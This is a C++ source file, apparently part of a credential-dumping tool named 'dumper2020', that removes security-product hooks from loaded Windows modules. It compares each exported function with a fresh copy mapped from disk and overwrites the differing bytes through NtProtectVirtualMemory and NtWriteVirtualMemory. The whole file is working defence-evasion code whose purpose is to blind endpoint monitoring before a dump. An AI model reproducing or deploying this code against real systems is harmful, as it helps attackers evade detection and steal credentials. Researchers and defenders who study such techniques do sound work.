#include "whisper.h"
#include "hooks.h"
#include <Psapi.h>
#include <iostream>
using namespace std;

#define PATCH_SIZE 16

// Function:    PatchHooks
// Description: Remove all function hooks in loaded modules
// Called from: dumper2020!Dump
VOID PatchHooks()
{
    HANDLE hProc = GetCurrentProcess(); // Handle to current process
    HMODULE* hModules = nullptr;        // Pointer to the buffer containing the module handles     
    DWORD dwModules = 0;                // Number of loaded modules

    // Enumerate loaded modules
    tie(hModules, dwModules) = GetModules();

    // Verify pointer is valid
    if (!hModules)
        return;

    // Loop through modules, start at 1 to skip ourselves
    for (DWORD i = 1; i < dwModules; i++)
    {
        // New module struct
        PLOADED_MODULE pModule = new LOADED_MODULE;

        // Assign current module handle to the struct
        pModule->Handle = hModules[i];

        // Get current module path and assign to the struct
        GetModuleFileNameExW(hProc, pModule->Handle, pModule->Path, MAX_PATH);

        // Check if any of the module's functions are hooked
        if (CheckModuleForHooks(pModule)) {

            wcout << "[=] Module: " << pModule->Path << endl;

            // Keep track of unhook attempts
            int success = 0;
            int failure = 0;
            
            // Loop through hooked functions and attempt to patch them
            for (auto itr = pModule->HookedFunctions.begin(); itr != pModule->HookedFunctions.end(); ++itr) {
                if (RestoreHookedFunction(*itr))
                    // Successfully patched function
                    success++;
                else
                    // Failed to patch function
                    failure++;

                // Free allocated memory
                if (*itr)
                    delete *itr;
            }

            // Clean up array of now invalid pointers
            pModule->HookedFunctions.clear();

            // Print stats
            if (success > 0)
                wcout << "    + UNHOOKED " << success << " functions" << endl;

            if (failure > 0)
                wcout << "    ! Failed to unhook " << failure << " functions" << endl;

        }
        
        // Free allocated memory
        if (pModule)
            delete pModule;
    }

    // Free allocated memory
    if (hModules)
        HeapFree(GetProcessHeap(), NULL, hModules);
}

// Function:    GetModules
// Description: Enumerate loaded modules in the current process
// Called from: PatchHooks
// Returns:     (1) Pointer to the memory block containing the module handles 
//              (2) Number of loaded modules
// Source:      https://github.com/jthuraisamy/TelemetrySourcerer/
tuple<HMODULE*, DWORD> GetModules()
{
    HANDLE hProc = GetCurrentProcess();                 // Current process handle
    HANDLE hHeap = GetProcessHeap();                    // Process heap handle
    DWORD RequiredBytes = 0;                            // Bytes required to store module handles
    DWORD ModuleHandlesSize = sizeof(HMODULE) * 1024;   // Initial allocation for buffer where module handles will be stored

    // Allocate memory for the handles and get a pointer
    HMODULE* ModuleHandles = (HMODULE*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ModuleHandlesSize);

    if (!ModuleHandles)
        // Allocation failed
        return { nullptr, 0 };

    // Enumerate modules
    BOOL status = EnumProcessModulesEx(hProc, ModuleHandles, ModuleHandlesSize, &RequiredBytes, LIST_MODULES_DEFAULT);

    if (!status || RequiredBytes > ModuleHandlesSize) {
        // Increase memory block to the required size
        ModuleHandles = (HMODULE*)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, ModuleHandles, RequiredBytes);

        if (!ModuleHandles)
            // Reallocation failed
            return { nullptr, 0 };

        // Attempt to enumerate process modules again
        status = EnumProcessModulesEx(hProc, ModuleHandles, RequiredBytes, &RequiredBytes, LIST_MODULES_DEFAULT);

        if (!status)
            // Failed a second time, let's move on
            return { nullptr, 0 };
    }

    DWORD ModuleCount = RequiredBytes / sizeof(HMODULE);

    return { ModuleHandles, ModuleCount };
}

// Function:    CheckModuleForHooks
// Description: Checks a given module for hooked functions by comparing against a fresh copy
// Arguments:   Pointer to a loaded module struct
// Called from: PatchHooks
// Returns:     True if there are hooked functions in the module
// Source:      https://github.com/jthuraisamy/TelemetrySourcerer/
BOOL CheckModuleForHooks(PLOADED_MODULE pModule)
{
    BOOL bReturn = FALSE;

    // Load a fresh copy in memory.
    HANDLE FmFileHandle = CreateFile(pModule->Path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE FmMappingHandle = CreateFileMapping(FmFileHandle, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    HMODULE FmHandle = (HMODULE)MapViewOfFile(FmMappingHandle, FILE_MAP_READ, 0, 0, 0);
    HMODULE LmHandle = pModule->Handle;

    // Parse the original module's PE headers.
    PIMAGE_DOS_HEADER LmDosHeader = (PIMAGE_DOS_HEADER)LmHandle;
    PIMAGE_NT_HEADERS LmNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)LmHandle + LmDosHeader->e_lfanew);

    // Parse the fresh module's PE headers.
    PIMAGE_DOS_HEADER FmDosHeader = (PIMAGE_DOS_HEADER)FmHandle;
    PIMAGE_NT_HEADERS FmNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)FmHandle + FmDosHeader->e_lfanew);

    // Check if the export table exists.
    if (LmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
        // Get the export table for the loaded module.
        PIMAGE_EXPORT_DIRECTORY LmExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)LmHandle + LmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        LPDWORD LmFunctionTable = (LPDWORD)((DWORD_PTR)LmHandle + LmExportDirectory->AddressOfFunctions);
        LPDWORD LmNameTable = (LPDWORD)((DWORD_PTR)LmHandle + LmExportDirectory->AddressOfNames);
        LPWORD LmOrdinalTable = (LPWORD)((DWORD_PTR)LmHandle + LmExportDirectory->AddressOfNameOrdinals);

        // Get the export table for the fresh module.
        PIMAGE_EXPORT_DIRECTORY FmExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)FmHandle + FmNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        LPDWORD FmFunctionTable = (LPDWORD)((DWORD_PTR)FmHandle + FmExportDirectory->AddressOfFunctions);
        LPDWORD FmNameTable = (LPDWORD)((DWORD_PTR)FmHandle + FmExportDirectory->AddressOfNames);
        LPWORD FmOrdinalTable = (LPWORD)((DWORD_PTR)FmHandle + FmExportDirectory->AddressOfNameOrdinals);

        // Walk the export table.
        for (DWORD i = 0; i < LmExportDirectory->NumberOfNames; i++) {
            // Get the address of the export (loaded + fresh).
            FARPROC LmFunction = (FARPROC)((DWORD_PTR)LmHandle + LmFunctionTable[LmOrdinalTable[i]]);
            FARPROC FmFunction = (FARPROC)((DWORD_PTR)FmHandle + FmFunctionTable[FmOrdinalTable[i]]);

            // Check if the address of the loaded export is executable. Skip if not.
            MEMORY_BASIC_INFORMATION mbi = { 0 };
            VirtualQuery(LmFunction, &mbi, sizeof(mbi));
            if ((mbi.Protect & PAGE_EXECUTE_READ) == 0)
                continue;

            // Check if the function is hooked by comparing memory between the loaded module and the fresh copy.
            if (memcmp(LmFunction, FmFunction, PATCH_SIZE))
            {
                PHOOKED_FUNCTION HookedFunction = new HOOKED_FUNCTION;

                HookedFunction->ModuleHandle = pModule->Handle;
                HookedFunction->Ordinal = LmOrdinalTable[i];
                HookedFunction->Address = LmFunction;
                MultiByteToWideChar(CP_UTF8, NULL, (LPCCH)((DWORD_PTR)LmHandle + LmNameTable[i]), -1, (LPWSTR)HookedFunction->Name, MAX_PATH - 1);
                CopyMemory(HookedFunction->FreshBytes, FmFunction, PATCH_SIZE);

                pModule->HookedFunctions.push_back(HookedFunction);

                bReturn = TRUE;
            }
        }
    }

    // Unmap fresh module.
    UnmapViewOfFile(FmHandle);
    CloseHandle(FmMappingHandle);
    CloseHandle(FmFileHandle);

    return bReturn;
}

// Function:    RestoreHookedFunction
// Description: Unhooks a function using bytes collected from a fresh copy
// Arguments:   Pointer to a hooked function struct
// Called from: PatchHooks
// Returns:     True if the function was successfully patched/unhooked
// Source:      https://github.com/jthuraisamy/TelemetrySourcerer/
BOOL RestoreHookedFunction(PHOOKED_FUNCTION pHookedFunction)
{
    HANDLE hProc = GetCurrentProcess();
    PVOID pPage = pHookedFunction->Address;
    SIZE_T pageSize = PATCH_SIZE;
    DWORD dwProtection = 0;
    SIZE_T cbWritten = 0;

    // Modify memory page containing the hooked function so we can patch it
    if (NtProtectVirtualMemory(hProc, &pPage, &pageSize, PAGE_READWRITE, &dwProtection) == 0)

        // Patch function in memory by overwriting with fresh bytes from disk
        if (NtWriteVirtualMemory(hProc, pHookedFunction->Address, pHookedFunction->FreshBytes, PATCH_SIZE, &cbWritten) == 0)

            // Restore original page protection settings (i.e. RX)
            if (NtProtectVirtualMemory(hProc, &pPage, &pageSize, dwProtection, &dwProtection) == 0)

                // Success
                return TRUE;
    
    return FALSE;
}